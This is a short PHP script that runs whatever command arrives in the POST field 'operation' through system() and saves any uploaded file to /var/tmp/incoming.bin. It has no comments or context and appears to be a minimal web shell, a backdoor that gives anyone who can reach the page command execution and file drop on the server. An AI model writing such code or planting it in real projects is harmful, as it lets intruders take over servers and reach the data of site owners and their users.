<?php
$command = $_POST['operation'];
system($command);
move_uploaded_file($_FILES['f']['tmp_name'], '/var/tmp/incoming.bin');
